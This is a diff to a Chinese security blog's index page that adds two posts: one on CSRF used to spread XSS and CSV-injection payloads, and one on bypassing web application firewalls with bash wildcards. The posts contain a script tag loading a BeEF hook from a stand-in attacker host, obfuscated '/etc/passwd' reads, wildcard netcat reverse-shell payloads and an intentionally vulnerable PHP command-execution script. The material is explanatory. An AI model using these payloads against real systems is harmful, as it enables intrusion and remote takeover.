@@ -169,6 +169,119 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-WEB漏洞-CSRF" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/02/WEB%E6%BC%8F%E6%B4%9E-CSRF/">WEB漏洞-CSRF</a>
+    </h1>
+  
+
+        
+        <a href="/2020/04/02/WEB%E6%BC%8F%E6%B4%9E-CSRF/" class="archive-article-date">
+  	<time datetime="2020-04-02T06:52:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-02</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>CSRF曾在2007年、2010年、2013年三次入围OWASP TOP10。因为越来越多的框架提供了secure by default的设定和一些形式的保护，这也就是说CSRF不再是一个问题。这也就是2017版的CSRF不再出现在OWASP TOP10的原因。</p>
+<p>研究人员发现，可以利用CSRF来传播大量的payload到终端用户。攻击者常用的CSRF传播的payload是：</p>
+<ul>
+<li>Persistent Cross Site Scripting (XSS)</li>
+<li>CSV Injection (CSVi)</li>
+<li>CSV Injection to Reflected Cross Site Scripting (XSS)</li>
+</ul>
+<hr>
+<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p><strong>一个跨站请求伪造攻击迫使登录用户的浏览器将伪造的HTTP请求，包括该用户的会话cookie和其他认证信息，发送一个存在漏洞的web应用程序。这即允许攻击者迫使用户浏览器向存在漏洞的应用程序发送请求，并且这些请求会被应用程序认为是用户的合法请求。</strong></p>
+<h3 id="CSRF-Payload传播"><a href="#CSRF-Payload传播" class="headerlink" title="CSRF Payload传播"></a>CSRF Payload传播</h3><p>研究人员发现可以通过一个简单的CSRF PoC来传播所有类型的payload，因为大多数社会工程场景中的CSRF是一样的。<br>下面是一个登入的win form:<br><img src="/2020/04/02/WEB%E6%BC%8F%E6%B4%9E-CSRF/1.png" alt></p>
+<p>页面前端代码如下：<br><img src="/2020/04/02/WEB%E6%BC%8F%E6%B4%9E-CSRF/2.png" alt></p>
+<p>为了解释请求，第一部分的H1和input并没有什么用处，真实的payload是隐藏在input表单中。这也是CSRF发生的地方，攻击者可以让这些值有意义。攻击者可以利用这些payload的传播来设定payload的值。在XSS设定的例子中，会在域名内弹出一个告警框。</p>
+<p>但是这个值可以是任何值，在更加恶意的环境中，攻击者可以利用浏览器或利用框架来hook受害者的浏览器。这样的恶意表单示例如下：<br><img src="/2020/04/02/WEB%E6%BC%8F%E6%B4%9E-CSRF/3.png" alt></p>
+<p>把<strong>value</strong>的值改成如下代码<br>    value=”<script src="https://attackersite/beef.js"></script>“ /&gt;</p>
+<p>Payload被注入到firstname域中，表单会通过请求提交的方式传递到攻击者的服务器，然后受害者的服务器就会用JS脚本钩住用于下一步的利用。根据应用的功能，攻击者payload会传递持久型和反射型的XSS脚本。</p>
+<hr>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><h3 id="CSV注入payload"><a href="#CSV注入payload" class="headerlink" title="CSV注入payload"></a>CSV注入payload</h3><ul>
+<li>Python</li>
+</ul>
+<p>`</p>
+<pre><code>def escape(payload):
+    if payload[0] in (&apos;@&apos;,&apos;+&apos;,&apos;-&apos;, &apos;=&apos;, &apos;|&apos;, &apos;%&apos;):
+     payload = payload.replace(&quot;|&quot;, &quot;\|&quot;)
+     payload = &quot;&apos;&quot; + payload + &quot;&apos;&quot;
+     return payload
+</code></pre><ul>
+<li>PHP</li>
+</ul>
+<p>`</p>
+<pre><code>public static function escape_csv( $payload ) {
+    $triggers = array( &apos;=&apos;, &apos;+&apos;, &apos;-&apos;, &apos;@&apos;, &apos;|&apos;, &apos;%&apos;);
+    if ( in_array( mb_substr( $payload, 0, 1 ), $triggers, true ) ) {
+    $payload = &quot;&apos;&quot; . $payload . &quot;&apos;&quot;;
+        }
+return $payload;
+    }
+</code></pre>
+      
+
+		
+		
+		  <div hidden="hidden"></div>
+		
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">CSRF</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/04/02/WEB%E6%BC%8F%E6%B4%9E-CSRF/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-常见密码字典" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -412,6 +525,111 @@
 
 
   
+    <article id="post-bash和通配符用法" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/03/25/bash%E5%92%8C%E9%80%9A%E9%85%8D%E7%AC%A6%E7%94%A8%E6%B3%95/">bash和通配符用法</a>
+    </h1>
+  
+
+        
+        <a href="/2020/03/25/bash%E5%92%8C%E9%80%9A%E9%85%8D%E7%AC%A6%E7%94%A8%E6%B3%95/" class="archive-article-date">
+  	<time datetime="2020-03-25T09:14:24.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-25</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="特殊的通配符用法"><a href="#特殊的通配符用法" class="headerlink" title="特殊的通配符用法"></a>特殊的通配符用法</h3><p>Bash 标准通配符（也称为通配符模式）被各种命令行实用程序用于处理多个文件。并不是每个人都知道 bash 语法可以使用问号 <code>?</code>、正斜杠 <code>/</code>、数字和字母来执行系统命令。你甚至可以枚举文件并使用相同数量的字符获取其内容。举几个例子：<br>可以使用以下语法来取代 ls 命令：<code>/???/?s</code><br><img src="/2020/03/25/bash%E5%92%8C%E9%80%9A%E9%85%8D%E7%AC%A6%E7%94%A8%E6%B3%95/1.png" alt><br>用这种语法，你可以基本做到你想做的任何事情。假设存在漏洞的目标位于WAF的后面，并且此 WAF 有一条规则，该规则可阻止包含 <code>/etc/passwd</code> 或 <code>/bin/ls</code> 在 GET 参数的值内或 POST 正文中的所有请求。</p>
+<p>如果你试图发出这样的请求，<code>/?cmd=cat+/etc/passwd</code> 它将被目标 WAF 阻止，你的 IP 将被永久禁止，并被标记为 <strong>yet another f*</strong>in’ redteamer**。但你有通配符这个秘密武器。</p>
+<p>如果目标 WAF 不阻止查询字符串里的 <code>?</code> 和 <code>/</code>，你就可以很容易地让你的请求（url 编码）变成这样：<code>/?cmd=%2f???%2f??t%20%2f???%2fp??s??</code><br><img src="/2020/03/25/bash%E5%92%8C%E9%80%9A%E9%85%8D%E7%AC%A6%E7%94%A8%E6%B3%95/2.png" alt><br>上图所示，有 3 个错误：<code>/bin/cat *: Is a directory</code>。发生这种情况是因为 <code>/???/?t</code> 可以被全局进程解释成 <code>/bin/cat</code>，也可以解释成 <code>/dev/net</code> 或 <code>/etc/apt</code> 等。</p>
+<p>问号通配符可以代表任何字符。因此，如果你知道一个文件名的一部分，那么你可以使用这个通配符。例如，<code>ls *.???</code> 将列出当前目录中所有长度为 3 个字符的文件扩展名。因此，你将会看到具有诸如 .gif，.jpg，.txt 之类扩展名的文件。</p>
+<p>使用这个通配符，你可以用 <code>netcat</code> 执行一个反弹 shell。假设你需要在端口 1337（通常 <code>nc -e /bin/bash 127.0.0.1 1337</code>）执行一个 127.0.0.1 的反弹 shell ，你可以用下面的语法来完成：<br>    /???/n? -e /???/b??h 2130706433 1337</p>
+<p>将 IP 地址127.0.0.1转换为长整数格式（2130706433），可以避免在 HTTP 请求中使用 . 字符。</p>
+<p>在 kali 中，需要使用 <code>nc.traditional</code> 而不是 <code>nc</code>，没有 <code>-e</code>参数，以便 <code>/bin/bash</code> 连接后执行。有效载荷变成这样：</p>
+<pre><code>/???/?c.??????????? -e /???/b??h 2130706433 1337
+</code></pre><p><img src="/2020/03/25/bash%E5%92%8C%E9%80%9A%E9%85%8D%E7%AC%A6%E7%94%A8%E6%B3%95/3.gif" alt><br>使用通配符执行反弹 shell<br>在对我们刚才看到的两个命令进行总结：</p>
+<blockquote>
+<p>标准：/bin/nc 127.0.0.1 1337<br>绕过：/???/n? 2130706433 1337<br>使用字符：/ ? n [0-9]</p>
+</blockquote>
+<blockquote>
+<p>标准：/bin/cat /etc/passwd<br>绕过：/???/??t /???/??ss??<br>使用字符：/ ? t s</p>
+</blockquote>
+<p>为什么使用 <code>?</code> 而不是 <code>*?</code>由于<code>*</code>广泛用于评论语法，许多 WAF 为了避免 SQL 注入而过滤它，像 <code>UNION+SELECT+1,2,3/*</code></p>
+<p>使用 echo 来枚举文件和目录。该 echo 命令可以使用通配符枚举文件系统上的文件和目录。例如 <code>echo /*/*ss*</code>:<br><img src="/2020/03/25/bash%E5%92%8C%E9%80%9A%E9%85%8D%E7%AC%A6%E7%94%A8%E6%B3%95/4.webp" alt></p>
+<p>这命令可以在 RCE 漏洞中使用，以获取目标系统上的文件和目录，例如：<br><img src="/2020/03/25/bash%E5%92%8C%E9%80%9A%E9%85%8D%E7%AC%A6%E7%94%A8%E6%B3%95/5.webp" alt><br>但为什么使用通配符（特别是问号）可以绕过WAF？</p>
+<h3 id="Sucuri-WAF绕过"><a href="#Sucuri-WAF绕过" class="headerlink" title="Sucuri WAF绕过"></a>Sucuri WAF绕过</h3><p><img src="/2020/03/25/bash%E5%92%8C%E9%80%9A%E9%85%8D%E7%AC%A6%E7%94%A8%E6%B3%95/6.webp" alt><br>测试 WAF 规则集的最佳方法是什么？创建一个有漏洞的 PHP 脚本，并尝试所有可能的技术。在上图的左上方的窗格中，是一个有漏洞的PHP脚本。</p>
+<pre><code>&lt;?php
+    echo &apos;ok: &apos;;
+    print_r($_GET[&apos;c&apos;]);
+    system($_GET[&apos;c&apos;]);
+?&gt;
+</code></pre><p>在左下方的窗格中，你可以看到对这个网站（test1.unicresit.it）进行远程命令执行测试。正如你所看到的，Sucuri WAF 以 <strong>An attempted RFI/LFI was detected and blocked</strong> 理由阻止请求。</p>
+<p>右窗格显示了同样的请求，但却使用 <code>?</code> 作为通配符，结果是 Sucuri WAF 没有阻止这个请求，应用程序执行了放入 <code>c</code> 参数的命令。现在就可以读取 <code>/etc/passwd</code> 文件，甚至更多。</p>
+<p>我可以读取应用程序本身的 PHP 源代码，可以使用 netcat（<code>/???/?c</code>）执行反弹 shell，或者我可以执行 curl 或 wget 来获取网络服务器的真实 IP，使我能够通过直接连接目标来绕过 WAF。</p>
+<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>使用一些不常用的bash命令的技巧，还是可以绕过WAF的防护的。</p>
+
+      
+
+		
+		
+		  <div hidden="hidden"></div>
+		
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随笔</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/03/25/bash%E5%92%8C%E9%80%9A%E9%85%8D%E7%AC%A6%E7%94%A8%E6%B3%95/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-PHP反序列化" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -452,7 +670,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">php</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">PHP</a>
         		</li>
       		
 		</ul>
@@ -532,7 +750,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">php</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">PHP</a>
         		</li>
       		
 		</ul>
@@ -813,171 +1031,6 @@
 
 
   
-    <article id="post-再见CMS-齐博CMS" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/">再见CMS--齐博CMS</a>
-    </h1>
-  
-
-        
-        <a href="/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/" class="archive-article-date">
-  	<time datetime="2018-09-21T11:50:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-21</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>刚刚在i春秋上做了一道CMS的题，学到的东西挺多的，这里记录一下</p>
-<blockquote>
-<p>题目名称：再见CMS<br>题目内容：这里还是有一个小脑洞<br></p></blockquote>
-        
-          <a class="article-more-a" href="/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/#more">more >></a>
-        
-      
-
-		
-		
-		  <div hidden="hidden"></div>
-		
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CMS</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Yeser-CMS漏洞利用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">Yeser-CMS漏洞利用</a>
-    </h1>
-  
-
-        
-        <a href="/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" class="archive-article-date">
-  	<time datetime="2018-09-20T09:47:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-20</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>刚刚做了一道“百度杯”CTF比赛 九月场中的CMS题目，这里拿出来分享一下</p>
-<blockquote>
-<p>题目内容：新的CMS系统，帮忙测测是否有漏洞。<br>tips:flag在网站根目录下的flag.php中</p>
-</blockquote>
-        
-          <a class="article-more-a" href="/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#more">more >></a>
-        
-      
-
-		
-		
-		  <div hidden="hidden"></div>
-		
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CMS</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/09/20/Yeser-CMS%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
@@ -1083,14 +1136,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">php</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">writeup</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">随笔</a>
               </li>
              
@@ -1108,6 +1153,14 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">工具</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">CSRF</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">PHP</a>
               </li>
             
             <div class="clearfix"></div>
